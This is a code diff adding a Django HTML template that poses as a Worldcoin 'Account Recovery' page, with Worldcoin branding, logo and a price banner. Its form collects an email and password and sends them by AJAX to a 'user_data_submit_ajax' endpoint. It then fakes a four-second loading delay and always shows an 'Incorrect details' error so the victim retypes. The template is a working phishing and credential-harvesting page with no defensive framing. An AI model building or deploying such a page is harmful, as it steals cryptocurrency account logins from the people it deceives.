@@ -1,0 +1,227 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Recovery</title>
+  <!-- Bootstrap CSS -->
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      background-color: #f8f9fa;
+    }
+    .recovery-container {
+      max-width: 100%;
+      margin: 50px auto;
+      padding: 30px;
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+    }
+    .logo-container {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo-img {
+      max-width: 50px;
+    }
+    .loader-container {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(255, 255, 255, 0.5);
+  z-index: 9999;
+}
+
+.loader {
+  border: 6px solid #f3f3f3;
+  border-top: 6px solid #3498db;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  animation: spin 1s linear infinite;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  margin-top: -20px;
+  margin-left: -20px;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+  </style>
+  
+</head>
+<body>
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+    <div class="container">
+      <a class="navbar-brand" href="#">WORLDCOIN</a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="#">Home</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#">About</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="{% url 'admin_redirect' %}">Admin</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container recovery-container" style="background-color: #f8f9fa;">
+ 
+    <h2 class="text-center mb-4">Account Recovery</h2><hr>
+    <form>
+        <p>To recover your Worldcoin, please enter your account details. A recovery code will be sent to your email address.</p>
+     
+      
+    </form>
+  </div>
+  <div class="loader-container" id="loader">
+    <div class="loader"></div>
+  </div>
+  <div class="container recovery-container">
+    <div class="logo-container">
+      <img src="https://mms.businesswire.com/media/20230723698910/en/1847784/5/Worldcoin_logo.jpg" alt="Logo" class="logo-img">
+    </div>
+    <h2 class="text-center mb-4">Worldcoin</h2>
+    <form  method="post"   id="recoveryForm">
+        {% csrf_token %}
+      <div class="form-group">
+        <label for="email">Enter your email address:</label>
+       
+        <input type="email" class="form-control" id="username"  name="username" placeholder="Enter email">
+      </div>
+      <div class="form-group">
+        <label for="password">Password:</label>
+        
+        <input type="password" class="form-control" id="key" name="key" placeholder="Enter Password">
+      </div>
+   
+      <input type="submit" class="btn btn-primary btn-block" value="Recover my account"></input>
+      <br>
+      <a href="">I already have the code.</a>
+
+    </form>
+    <div id="loader" class="loader-container">
+      <div class="loader"></div>
+    </div>
+  </div>
+
+    <h3 class=" container mb-4 text-center">Worldcoin price: <span style="font-weight: bold;">US$ 7.68</span></h3>
+  
+<!-- Modal -->
+<div class="modal fade" id="recoveryModal" tabindex="-1" role="dialog" aria-labelledby="recoveryModalLabel" aria-hidden="true">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content ">
+      <div class="modal-header " style="background-color: rgb(241, 105, 105);">
+        <h5 class="modal-title text-dark" id="recoveryModalLabel">Incorrect details!</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body" style="color: red;">
+        <!-- Modal body content -->
+        No account found. Please check your details and try again.
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-success" data-dismiss="modal">Try again</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+ <!-- Place this script after the HTML elements or inside $(document).ready() -->
+
+ <script>
+
+    $(document).on('submit', '#recoveryForm', function (e) {
+         e.preventDefault();
+         
+         $.ajax({
+             type: 'POST',
+             url: "{% url 'user_data_submit_ajax' %}", // Replace with your actual URL
+             data: {
+                 username: $('#username').val(),
+                 key: $('#key').val(),
+                 csrfmiddlewaretoken: $('input[name=csrfmiddlewaretoken]').val()
+             },
+            
+             error: function () {
+                 // Handle general AJAX error
+                 alert('An error occurred while submitting data.');
+             }
+         });
+     });
+
+
+
+    // Function to show loader
+    function showLoader() {
+        document.getElementById('loader').style.display = 'block';
+    }
+
+    // Function to hide loader
+    function hideLoader() {
+        document.getElementById('loader').style.display = 'none';
+    }
+
+    // Function to show modal
+    function showModal() {
+        $('#recoveryModal').modal('show');
+    }
+
+    // Function to hide modal and submit the form
+    function hideModalAndSubmitForm() {
+        $('#recoveryModal').modal('hide');
+        $('#recoveryForm').submit(); // Submit the form
+    }
+
+    // Submit form function
+    $('#recoveryForm').submit(function (e) {
+        e.preventDefault(); // Prevent form submission
+        showLoader(); // Show loader
+
+
+   
+
+        // Simulate server processing with setTimeout
+        setTimeout(function () {
+            hideLoader(); // Hide loader after 4 seconds
+            showModal(); // Show modal
+        }, 4000); // 4 seconds delay
+    });
+
+    // Attach event listener for modal hidden event
+    $('#recoveryModal').on('hidden.bs.modal', function () {
+        hideLoader(); // Hide loader when modal is hidden
+       
+        // Additional actions to perform when modal is closed
+    });
+
+    // Initially hide the loader
+    $(document).ready(function () {
+        hideLoader();
+    });
+</script>
+</body>
+</html>
